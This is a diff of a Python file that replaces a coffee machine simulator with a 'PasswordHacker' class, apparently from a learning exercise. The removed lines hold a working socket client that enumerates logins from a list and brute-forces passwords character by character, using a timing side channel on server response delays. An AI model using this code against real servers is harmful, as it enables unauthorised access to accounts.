@@ -1,31 +1,23 @@
-"""The functionality for hacking credentials: login and/or password."""
-
-import argparse
-import datetime
-import itertools
-import json
-import socket
-import timeit
-from string import ascii_letters, digits
+# $Coffee Machine
+"""functionality that simulates a real coffee machine"""
 
 
-class PasswordHacker:
-    """The creation of the PasswordHacker object and related functionality."""
+class CoffeeMachine:
+    """Creation of the CoffeeMachine object and related functionality."""
     
-    chars = list(ascii_letters + digits)
+    ingredients_per_cup = {'water': 200, 'milk': 50, 'coffee beans': 15}
     n_ph = 0
     
-    def __init__(self, hostname, port):
+    def __init__(self):
         """The initializer of the class.
 
         Arguments:
-        hostname -- string, IP or domain
-        port -- integer
-        counter -- integer, for log-file
+        available - {'water': _, 'milk': _, 'coffee beans': _}
         """
-        self.hostname = hostname
-        self.port = port
-        self.counter = 0
+        # self.ingredients = CoffeeMachine.ingredient_calculator()
+        self.ingredients = None
+        self.available = CoffeeMachine.request_amounts()  # stock of ingredients
+        self.cups_needed = CoffeeMachine.request_cups_num()
     
     def __new__(cls, *args, **kwargs):
         if cls.n_ph == 0:
@@ -34,97 +26,72 @@ class PasswordHacker:
         return None
     
     def __repr__(self):
-        return f'Password Hacker object with:\n' \
-               f'IP ADDRESS: {self.hostname}\n' \
-               f'PORT: {self.port}\n'
+        return f'CoffeeMachine object with:\n' \
+               f'stock of ingredients: {self.available}\n'
     
     def __str__(self):
         return self.__repr__()
     
     @staticmethod
-    def chars_iterator():
-        yield from itertools.cycle(PasswordHacker.chars)
-
+    def print_process():
+        file_name = 'process.txt'
+        # file_name = r'C:\Users\Тоша\PycharmProjects\Coffee Machine\Coffee Machine\task\machine\process.txt'
+        with open(file_name, 'r') as f:
+            for line in f:
+                print(line.strip('\n'))
+    
+    def ingredient_calculator(self):
+        """for stage 2/6"""
+        quantity = self.cups_needed  # the numbers of coffee drinks
+        # ingredients_per_cup = {'water': 200, 'milk': 50, 'coffee beans': 15}
+        result = {'cups': quantity}
+        for key, value in CoffeeMachine.ingredients_per_cup.items():
+            result.update({key: CoffeeMachine.ingredients_per_cup[key] * quantity})
+        return result
+    
+    def print_needed_supplies(self):
+        """for stage 2/6"""
+        print(self.ingredients)
+        keys_ = list(self.ingredients.keys())
+        print(f'For {self.ingredients[keys_[0]]} cups of coffee you will need:',
+              f'{self.ingredients[keys_[1]]} ml of water',
+              f'{self.ingredients[keys_[2]]} ml of milk',
+              f'{self.ingredients[keys_[3]]} g of coffee beans', sep='\n')
+    
     @staticmethod
-    def find_login(logins_file, socket):
-        with open(logins_file, 'r') as file:
-            for line in file:
-                login = line.rstrip('\n')
-                response = PasswordHacker.get_response(socket, login)
-                if response['result'] == 'Wrong password!':
-                    return login
-
+    def request_amounts():
+        """Request the amounts of water, milk, and coffee beans available at the moment."""
+        result = dict()
+        print('Write how many ml of water the coffee machine has:')
+        result['water'] = int(input())
+        print('Write how many ml of milk the coffee machine has:')
+        result['milk'] = int(input())
+        print('Write how many grams of coffee beans the coffee machine has:')
+        result['coffee beans'] = int(input())
+        return result
+    
     @staticmethod
-    def get_response(socket, login, password=' '):
-        """Use json module to serialize sent and received messages"""
-        json_auth = json.dumps({"login": login, "password": password})
-        socket.send(json_auth.encode())
-        return json.loads(socket.recv(1024).decode())
+    def request_cups_num():
+        """Ask for the number of cups a user needs."""
+        print('Write how many cups of coffee you will need:')
+        return int(input())
     
-    
-    def log(self, something):
-        """Save any intermediate result in log-file."""
-        with open('log.txt', 'a') as f:
-            f.write(f'{self.counter}: {something} \n')
-
-    
-    def time_based_vulnerability(self, logins_file):
-        """Algorithm used when admin just caught the exception: there should be a delay
-        in the server response
-        """
-        with socket.socket() as client_socket:
-            client_socket.connect((self.hostname, self.port))
-            # find the login; save it in valid_login
-            valid_login = PasswordHacker.find_login(logins_file, client_socket)
-            PasswordHacker.log(self, valid_login)  # save in log.txt
-            self.counter += 1
-            
-            # find password
-            password = ""
-            try:
-                for char in PasswordHacker.chars_iterator():
-                    password_guess = password + char
-                    first_time = datetime.datetime.now()
-                    response = PasswordHacker.get_response(client_socket, valid_login, password_guess)
-                    later_time = datetime.datetime.now()
-                    time_delay = later_time - first_time
-                   
-                    if response["result"] == "Connection success!":
-                        return json.dumps({"login": valid_login, "password": password_guess})
-                    elif time_delay.microseconds >= 90000:
-                        PasswordHacker.log(self, password_guess)  # save in log.txt
-                        self.counter += 1
-                        PasswordHacker.log(self, time_delay)  # save in log.txt
-                        self.counter += 1
-                        password = password_guess
-            except StopIteration:
-                return None
+    def calculator(self):
+        """for stage 3/6"""
+        # self.cups_needed  # the numbers of coffee drinks
+        calc = []
+        for key in self.available.keys():
+            calc.append(self.available[key] // CoffeeMachine.ingredients_per_cup[key])
+        cups_possible = min(calc)
+        if cups_possible == self.cups_needed:
+            print('Yes, I can make that amount of coffee')
+        elif cups_possible > self.cups_needed:
+            n = cups_possible - self.cups_needed
+            print(f'Yes, I can make that amount of coffee (and even {n} more than that)')
+        else:
+            print(f'No, I can make only {cups_possible} cups of coffee')
 
 
-def args():
-    """Get arguments from command line. Return parser object with attributes."""
-    
-    parser = argparse.ArgumentParser(description="This program receives 2 arguments \
-     and tries to connect to address with generated password through a socket")
-    parser.add_argument("IP", help="Type IP address like 127.0.0.1 ")
-    parser.add_argument("port", default="9090",
-                        help="Specify port like 9090")
-    # parser.add_argument("message", help="Type message for sending")
-    return parser.parse_args()
-
-
-def main():
-    file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt'
-    # file_name ='logins.txt'
-    arguments = args()
-    ip, port = arguments.IP, int(arguments.port)
-    hacker_object = PasswordHacker(ip, port)
-    result = hacker_object.time_based_vulnerability(file_name)
-    if result is None:
-        print('-> Password not found <-')
-    else:
-        print(result)
-
-
-if __name__ == '__main__':
-    main()
+new_order = CoffeeMachine()
+# new_order.print_needed_supplies()
+new_order.calculator()
